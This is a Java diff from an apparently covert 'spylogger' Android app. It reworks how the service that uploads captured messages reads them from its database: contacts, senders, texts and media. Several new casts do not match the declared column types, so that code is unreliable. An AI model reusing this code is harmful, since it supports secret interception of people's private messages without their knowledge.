@@ -14,6 +14,7 @@ import com.gravatasufoca.spylogger.vos.ContatoVO;
 import com.gravatasufoca.spylogger.vos.RespostaRecebimentoVO;
 import com.j256.ormlite.dao.Dao;
 import com.j256.ormlite.dao.GenericRawResults;
+import com.j256.ormlite.field.DataType;
 import com.j256.ormlite.stmt.UpdateBuilder;
 
 import java.io.File;
@@ -166,27 +167,29 @@ public class SendMensagensService extends SendDataService<RespostaRecebimentoVO>
             up2.updateColumnValue("enviada", false);
             up2.update();*/
 
-            Map<String, Integer> colunas = Mensagem.columns();
+            Map<String, Map<Integer, DataType>> colunas = Mensagem.columns();
 
-            GenericRawResults<String[]> raws = daoMensagem.queryRaw("select " + getColunas(colunas) + " from mensagem where enviada=0 ");
+//            GenericRawResults<Object[]> raws = daoMensagem.queryRaw("select " + getColunas(colunas) + " from mensagem where enviada=0 ",getTipos(colunas));
+            GenericRawResults<Object[]> raws = daoMensagem.queryRaw("select id,contato,tipoMidia,remetente,midiaMime,numeroContato,tamanhoArquivo,texto,topico_id,data,dataRecebida ,raw_data, thumb_image from mensagem where enviada=0 ",
+                    new DataType[]{DataType.INTEGER,DataType.STRING,DataType.INTEGER,DataType.BOOLEAN_INTEGER,DataType.STRING,DataType.STRING,DataType.STRING,DataType.STRING,DataType.INTEGER,DataType.DATE_LONG,DataType.DATE_LONG,DataType.BYTE_ARRAY,DataType.BYTE_ARRAY});
             List<Mensagem> mensagens = new ArrayList<>();
             contador = 0;
-            Iterator<String[]> iterator = raws.iterator();
+            Iterator<Object[]> iterator = raws.iterator();
             while (iterator.hasNext()) {
-                String[] resultRaw = iterator.next();
+                Object[] resultRaw = iterator.next();
                 try {
                     Mensagem mensagem = new Mensagem.MensagemBuilder()
-                            .setId(Integer.valueOf(resultRaw[colunas.get("id")]))
-                            .setContato(resultRaw[colunas.get("contato")])
-                            .setTipoMidia(resultRaw[colunas.get("tipoMidia")] == null ? TipoMidia.CONTATO : TipoMidia.valueOf(resultRaw[colunas.get("tipoMidia")]))
-                            .setRemetente("1".equals(resultRaw[colunas.get("remetente")]))
-                            .setMediaMime(resultRaw[colunas.get("midiaMime")])
-                            .setNumeroContato(resultRaw[colunas.get("numeroContato")])
-                            .setTamanhoArquivo(resultRaw[colunas.get("tamanhoArquivo")] != null && resultRaw[colunas.get("tamanhoArquivo")].length() > 0 ? Long.parseLong(resultRaw[colunas.get("tamanhoArquivo")]) : null)
-                            .setTexto(resultRaw[colunas.get("texto")])
-                            .setTopico(new Topico.TopicoBuilder().setId(Integer.valueOf(resultRaw[colunas.get("topico_id")])).build(null))
-                            .setData(new Date(Long.parseLong(resultRaw[colunas.get("data")])))
-                            .setDataRecebida(new Date(Long.parseLong(resultRaw[colunas.get("dataRecebida")])))
+                            .setId((Integer) resultRaw[colunas.get("id").keySet().iterator().next()])
+                            .setContato((String) resultRaw[colunas.get("contato").keySet().iterator().next()])
+                            .setTipoMidia(resultRaw[colunas.get("tipoMidia").keySet().iterator().next()] == null ? TipoMidia.CONTATO : (TipoMidia) resultRaw[colunas.get("tipoMidia").keySet().iterator().next()])
+                            .setRemetente("1".equals(resultRaw[colunas.get("remetente").keySet().iterator().next()]))
+                            .setMediaMime((String) resultRaw[colunas.get("midiaMime").keySet().iterator().next()])
+                            .setNumeroContato((String) resultRaw[colunas.get("numeroContato").keySet().iterator().next()])
+                            .setTamanhoArquivo((Long) resultRaw[colunas.get("tamanhoArquivo").keySet().iterator().next()])
+                            .setTexto((String) resultRaw[colunas.get("texto").keySet().iterator().next()])
+                            .setTopico(new Topico.TopicoBuilder().setId((Integer) resultRaw[colunas.get("topico_id").keySet().iterator().next()]).build(null))
+                            .setData((Date) resultRaw[colunas.get("data").keySet().iterator().next()])
+                            .setDataRecebida((Date) resultRaw[colunas.get("dataRecebida").keySet().iterator().next()])
                             .build();
 //                    mensagem.setRaw_data(resultRaw[colunas.get("raw_data")]);
 
@@ -211,12 +214,12 @@ public class SendMensagensService extends SendDataService<RespostaRecebimentoVO>
         }
     }
 
-    private String getColunas(Map<String, Integer> colunas) {
+    private String getColunas(Map<String, Map<Integer,DataType>> colunas) {
         Set<String> keys = colunas.keySet();
         StringBuffer cols = new StringBuffer();
         Map<Integer, String> inverso = new HashMap<>();
         for (String col : keys) {
-            Integer a = colunas.get(col);
+            Integer a = colunas.get(col).keySet().iterator().next();
             inverso.put(a, col);
         }
         List<Integer> ids = new ArrayList<>(inverso.keySet());
@@ -227,6 +230,25 @@ public class SendMensagensService extends SendDataService<RespostaRecebimentoVO>
 
         }
         return cols.toString();
+    }
+
+    private DataType[] getTipos(Map<String, Map<Integer,DataType>> colunas) {
+        Set<String> keys = colunas.keySet();
+        StringBuffer cols = new StringBuffer();
+        Map<Integer, DataType> inverso = new HashMap<>();
+        for (String col : keys) {
+            Integer a = colunas.get(col).keySet().iterator().next();
+            inverso.put(a, colunas.get(col).values().iterator().next());
+        }
+        List<Integer> ids = new ArrayList<>(inverso.keySet());
+        Collections.sort(ids);
+        List<DataType> tipos=new ArrayList<>();
+        for (Integer id : ids) {
+            tipos.add(inverso.get(id));
+        }
+        DataType[] tmp=new DataType[tipos.size()];
+        tipos.toArray(tmp);
+        return tmp;
     }
 
     private void enviarMensagens(List<Mensagem> mensagens) {
